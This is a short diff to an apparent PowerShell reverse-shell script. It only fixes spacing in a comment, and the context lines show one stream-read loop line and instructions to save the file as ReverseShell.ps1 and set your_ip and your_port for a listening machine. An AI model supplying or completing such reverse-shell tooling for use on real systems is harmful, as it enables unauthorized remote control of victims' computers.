@@ -24,6 +24,6 @@ while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
 }
 
 #############################################################################################################
-#Save the above PowerShell script in a file named ReverseShell.ps1.
+# Save the above PowerShell script in a file named ReverseShell.ps1.
 # Modify the your_ip and your_port placeholders with the IP address and port number of the listening machine.
 #############################################################################################################
